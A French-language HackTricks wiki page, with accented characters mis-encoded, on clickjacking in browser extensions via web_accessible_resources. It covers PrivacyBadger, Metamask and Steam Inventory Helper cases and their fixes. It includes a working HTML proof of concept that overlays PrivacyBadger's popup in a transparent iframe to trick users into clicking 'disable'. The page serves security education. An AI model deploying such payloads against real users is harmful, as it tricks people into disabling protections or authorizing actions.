# BrowExt - ClickJacking

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge HackTricks AWS)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informations de base

Cette page va exploiter une vuln√©rabilit√© de ClickJacking dans une extension de navigateur.\
Si vous ne savez pas ce qu'est le ClickJacking, consultez :

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

Les extensions contiennent le fichier **`manifest.json`** et ce fichier JSON a un champ `web_accessible_resources`. Voici ce que [les documents Chrome](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources) en disent :

> Ces ressources seraient alors disponibles dans une page web via l'URL **`chrome-extension://[ID DU PACKAGE]/[CHEMIN]`**, qui peut √™tre g√©n√©r√©e avec la m√©thode **`extension.getURL`**. Les ressources autoris√©es sont servies avec des en-t√™tes CORS appropri√©s, elles sont donc disponibles via des m√©canismes tels que XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

Les **`web_accessible_resources`** dans une extension de navigateur ne sont pas seulement accessibles via le web ; ils fonctionnent √©galement avec les privil√®ges inh√©rents de l'extension. Cela signifie qu'ils ont la capacit√© de :

* Changer l'√©tat de l'extension
* Charger des ressources suppl√©mentaires
* Interagir avec le navigateur dans une certaine mesure

Cependant, cette fonctionnalit√© pr√©sente un risque de s√©curit√©. Si une ressource dans **`web_accessible_resources`** a une fonctionnalit√© significative, un attaquant pourrait potentiellement int√©grer cette ressource dans une page web externe. Les utilisateurs qui visitent cette page sans m√©fiance pourraient activer involontairement cette ressource int√©gr√©e. Une telle activation pourrait entra√Æner des cons√©quences non intentionnelles, en fonction des autorisations et des capacit√©s des ressources de l'extension.

## Exemple de PrivacyBadger

Dans l'extension PrivacyBadger, une vuln√©rabilit√© a √©t√© identifi√©e concernant le r√©pertoire `skin/` d√©clar√© comme `web_accessible_resources` de la mani√®re suivante (Consultez le [billet de blog original](https://blog.lizzie.io/clickjacking-privacy-badger.html)) :
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Cette configuration a conduit √† un probl√®me de s√©curit√© potentiel. Plus pr√©cis√©ment, le fichier `skin/popup.html`, qui est affich√© lors de l'interaction avec l'ic√¥ne PrivacyBadger dans le navigateur, pourrait √™tre int√©gr√© dans un `iframe`. Cette int√©gration pourrait √™tre exploit√©e pour tromper les utilisateurs en les incitant √† cliquer involontairement sur "D√©sactiver PrivacyBadger pour ce site Web". Une telle action compromettrait la vie priv√©e de l'utilisateur en d√©sactivant la protection de PrivacyBadger et en exposant potentiellement l'utilisateur √† un suivi accru. Une d√©monstration visuelle de cette exploitation peut √™tre visionn√©e dans un exemple vid√©o de ClickJacking fourni √† l'adresse [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

Pour rem√©dier √† cette vuln√©rabilit√©, une solution simple a √©t√© mise en ≈ìuvre : la suppression de `/skin/*` de la liste des `web_accessible_resources`. Ce changement a efficacement att√©nu√© le risque en veillant √† ce que le contenu du r√©pertoire `skin/` ne puisse pas √™tre acc√©d√© ou manipul√© via des ressources accessibles par le web.

La correction √©tait simple : **supprimer `/skin/*` des `web_accessible_resources`**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Exemple Metamask

Un [**article de blog sur une attaque par ClickJacking dans Metamask peut √™tre trouv√© ici**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). Dans ce cas, Metamask a corrig√© la vuln√©rabilit√© en v√©rifiant que le protocole utilis√© pour y acc√©der √©tait **`https:`** ou **`http:`** (et non **`chrome:`** par exemple) :

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

**Un autre ClickJacking corrig√©** dans l'extension Metamask √©tait que les utilisateurs pouvaient **Cliquer pour autoriser** lorsqu'une page √©tait suspect√©e d'√™tre une tentative de phishing en raison de `‚Äúweb_accessible_resources‚Äù: [‚Äúinpage.js‚Äù, ‚Äúphishing.html‚Äù]`. Comme cette page √©tait vuln√©rable au Clickjacking, un attaquant pouvait en abuser en montrant quelque chose de normal pour inciter la victime √† cliquer pour l'autoriser sans s'en rendre compte, puis revenir √† la page de phishing qui serait autoris√©e.

## Exemple Steam Inventory Helper

Consultez la page suivante pour voir comment une **XSS** dans une extension de navigateur a √©t√© associ√©e √† une vuln√©rabilit√© de **ClickJacking** :

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## R√©f√©rences

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
